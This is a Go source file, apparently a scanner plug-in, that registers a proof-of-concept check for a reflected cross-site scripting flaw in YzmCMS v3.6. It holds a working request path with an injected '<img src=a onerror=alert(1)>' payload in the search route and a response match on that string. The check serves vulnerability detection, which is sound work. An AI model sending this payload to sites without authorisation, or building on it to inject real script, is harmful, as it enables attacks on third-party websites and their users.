package poc

func (Info *PocInfo) YZM_CMS_XSS_Init() {
	poc := PocInfo{}

	// 设置poc-Info信息
	poc.Info.ID = ""
	poc.Info.Target = "yzmcms"
	poc.Info.Type = "XSS"
	poc.Info.Name = "YzmCMS v3.6 reflect XSS"
	poc.Info.Level = 3
	poc.Info.Author = "youzai"

	// 设置poc-Poc信息
	poc.Poc.Proto = "http"
	poc.Poc.Method = "GET"
	poc.Poc.Path = []string{"/index.php?m=search&c=index&a=initxqb4n<img%20src%3da%20onerror%3dalert(1)>cu9rs&modelid=1&q=tes"}
	poc.Poc.Param = []string{""}
	poc.Poc.Header = func() map[string]string {
		mapTemp := make(map[string]string)
		mapTemp["Content-Type"] = "application/x-www-form-urlencoded"
		return mapTemp
	}()
	poc.Poc.Data = []string{""}
	poc.Poc.Word = []string{"<img src=a onerror=alert(1)>"}

	// 设置poc-Config信息
	poc.Config.Customize = false

	PocStruct = append(PocStruct, poc)
}
